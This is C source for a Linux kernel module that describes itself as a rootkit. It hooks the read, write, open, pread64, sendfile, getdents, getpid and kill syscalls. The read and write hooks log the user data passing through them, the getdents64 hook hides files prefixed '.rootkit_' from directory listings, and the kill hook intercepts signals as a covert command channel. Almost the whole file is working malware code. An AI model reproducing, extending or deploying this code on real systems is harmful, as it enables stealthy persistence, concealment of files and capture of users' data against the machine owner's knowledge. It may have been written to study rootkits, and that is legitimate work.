#include "rootkit-main.h"

#include "hooking.h"
#include "macro-utils.h"
#include "utils.h"
#include <linux/dirent.h>
#include <linux/ioctl.h>
#include <linux/limits.h>
#include <linux/linkage.h>
#include <linux/miscdevice.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
MODULE_DESCRIPTION("A Linux kernel rootkit");
MODULE_VERSION("0.1");

static const char S_HIDDEN_PREFIX[] = ".rootkit_";
#define SZ_HIDDEN_PREFIX_LEN (sizeof(S_HIDDEN_PREFIX) - 1)

static int __init rootkit_init(void)
{
    int i_err = 0;

    // Initialize hooking
    i_err = init_hooking();

    if (i_err) {
        pr_err("[ROOTKIT] Failed to initialize hooking\n");
        return i_err;
    }

    hook_syscalls(P_SYSCALL_HOOKS, NR_SYSCALL_HOOKS);

    pr_info("[ROOTKIT] Module loaded\n");
    return 0;
}

static __exit void rootkit_exit(void)
{
    // Restore original syscall functions
    unhook_syscalls(P_SYSCALL_HOOKS, NR_SYSCALL_HOOKS);

    pr_info("[ROOTKIT] Module unloaded\n");
    return;
}

SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __user *, s_buf, size_t,
                      sz_count)
{
    long l_err   = 0;
    long l_ret   = 0;
    char *s_data = NULL;

    pr_info("[ROOTKIT] read(%u, %p, %zu)\n", ui32_fd, s_buf, sz_count);

    l_ret = orig_read(p_regs);

    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

    if (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
    } else {
        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user\n");
        } else {
            pr_info("[ROOTKIT] * Data read: %.*s\n", (int)sz_count, s_data);
        }

        kvfree(s_data);
    }

    return l_ret;
}

SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const char __user *, s_buf,
                      size_t, sz_count)
{
    long l_err   = 0;
    char *s_data = NULL;

    pr_info("[ROOTKIT] write(%u, %p, %zu)\n", ui32_fd, s_buf, sz_count);

    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

    if (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
    } else {
        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user\n");
        } else {
            pr_info("[ROOTKIT] * Data to write: %.*s\n", (int)sz_count, s_data);
        }

        kvfree(s_data);
    }

    return orig_write(p_regs);
}

SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                      umode_t, ui16_mode)
{
    long l_err         = 0;
    char *s_filename_k = NULL;

    s_filename_k = (char *)kvmalloc(PATH_MAX, GFP_KERNEL);

    if (s_filename_k == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
    } else {
        l_err = strncpy_from_user(s_filename_k, s_filename, PATH_MAX);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy filename from user\n");
            strncpy(s_filename_k, "(unknown)", PATH_MAX);
        }

        pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)\n", s_filename_k, i32_flags, ui16_mode);

        kvfree(s_filename_k);
    }

    return orig_open(p_regs);
}

SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char __user *, s_buf,
                      size_t, sz_count, loff_t, i64_pos)
{
    long l_err   = 0;
    long l_ret   = 0;
    char *s_data = NULL;

    pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)\n", ui32_fd, s_buf, sz_count, i64_pos);

    l_ret = orig_pread64(p_regs);

    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

    if (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
    } else {
        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user\n");
        } else {
            pr_info("[ROOTKIT] * Data read: %.*s\n", (int)sz_count, s_data);
        }

        kvfree(s_data);
    }

    return l_ret;
}

SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32_in_fd,
                      loff_t __user *, p_offset, size_t, sz_count)
{
    pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)\n", i32_out_fd, i32_in_fd, p_offset, sz_count);

    return orig_sendfile(p_regs);
}

SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd,
                      struct linux_dirent __user *, p_dirent, unsigned int, ui32_count)
{
    pr_info("[ROOTKIT] getdents(%u, %p, %u)\n", ui32_fd, p_dirent, ui32_count);
    // TODO: Implement same logic as getdents64
    // Maybe use a common function

    return orig_getdents(p_regs);
}

SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd,
                      struct linux_dirent64 __user *, p_dirent, unsigned int, ui32_count)
{
    long l_ret_orig          = 0; // Original return value of the real syscall
    long l_ret               = 0; // Return value that will be returned to the caller
    long l_err               = 0; // Error code of the copy functions
    long l_move_len          = 0; // Length of the data to move
    unsigned short us_reclen = 0; // Length of the current directory entry

    struct linux_dirent64 *p_dirent_k    = NULL; // Kernel buffer
    struct linux_dirent64 *p_dirent_k_it = NULL; // Directory entry array iterator

    pr_info("[ROOTKIT] getdents64(%u, %p, %u)\n", ui32_fd, p_dirent, ui32_count);

    l_ret_orig = orig_getdents64(p_regs);
    if (l_ret_orig <= 0) {
        // No entries or error, return immediately
        if (l_ret_orig == 0) {
            pr_info("[ROOTKIT] * No entries\n");
        } else {
            pr_err("[ROOTKIT] * Error: %ld\n", l_ret_orig);
        }
        return l_ret_orig;
    }

    p_dirent_k = (struct linux_dirent64 *)kzalloc(l_ret_orig, GFP_KERNEL);

    if (p_dirent_k == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
        return l_ret_orig;
    }

    // Copy data from user to kernel
    l_err = copy_from_user(p_dirent_k, p_dirent, l_ret_orig);

    if (l_err != 0) {
        pr_err("[ROOTKIT] * Could not copy data from user\n");
        kfree(p_dirent_k);
        return l_ret_orig;
    }

    pr_info("[ROOTKIT] * Directory entries:\n");

    p_dirent_k_it = p_dirent_k;
    l_ret         = l_ret_orig;

    while ((char *)p_dirent_k_it < (char *)p_dirent_k + l_ret && p_dirent_k_it->d_reclen != 0) {
        pr_info("[ROOTKIT]   * %s\n", p_dirent_k_it->d_name);

        us_reclen = p_dirent_k_it->d_reclen;

        // Check if the current directory entry has to be hidden
        if (!strncmp(p_dirent_k_it->d_name, S_HIDDEN_PREFIX, SZ_HIDDEN_PREFIX_LEN)) {
            pr_info("[ROOTKIT]     * Hiding directory entry\n");

            // If this is the last directory entry, we have nothing special to do
            if ((char *)p_dirent_k_it + us_reclen < (char *)p_dirent_k + l_ret) {
                // The current directory entry is not the last one,
                // so we have to move the next entries to the current position
                l_move_len = l_ret - ((char *)p_dirent_k_it - (char *)p_dirent_k) - us_reclen;
                memmove(p_dirent_k_it, (char *)p_dirent_k_it + us_reclen, l_move_len);
            }

            // Decrease the total length
            l_ret -= us_reclen;
        } else {
            // Update the iterator to the next directory entry
            p_dirent_k_it = (struct linux_dirent64 *)((char *)p_dirent_k_it + us_reclen);
        }
    }

    // Copy data back to user
    l_err = copy_to_user(p_dirent, p_dirent_k, l_ret);

    if (l_err == 0) {
        // Erase the rest of the user buffer to avoid leaking data
        l_err = clear_user((char *)p_dirent + l_ret, l_ret_orig - l_ret);
        if (l_err != 0) {
            pr_err("[ROOTKIT] * Could not clear user buffer\n");
        }
    } else {
        pr_err("[ROOTKIT] * Could not copy data back to user\n");
    }

    kfree(p_dirent_k);
    return l_ret;
}

SYSCALL_HOOK_HANDLER0(getpid, orig_getpid, p_regs)
{
    pr_info("[ROOTKIT] getpid()\n");

    return orig_getpid(p_regs);
}

SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
{
    size_t i;

    pr_info("[ROOTKIT] kill(%d, %d)\n", i32_pid, i32_sig);

    for (i = 0; i < ARRAY_SIZE(p_sig_handlers); ++i) {
        if ((p_sig_handlers[i].i32_pid < 0 || p_sig_handlers[i].i32_pid == i32_pid) &&
            (p_sig_handlers[i].i32_sig < 0 || p_sig_handlers[i].i32_sig == i32_sig)) {
            pr_info("[ROOTKIT] * Intercepting signal %d for PID %d\n", i32_sig, i32_pid);
            p_sig_handlers[i].sig_handler(i32_pid, i32_sig);

            // Signal was intercepted, return success
            return 0;
        }
    }

    // Signal was not intercepted, forward it to the original syscall
    return orig_kill(p_regs);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
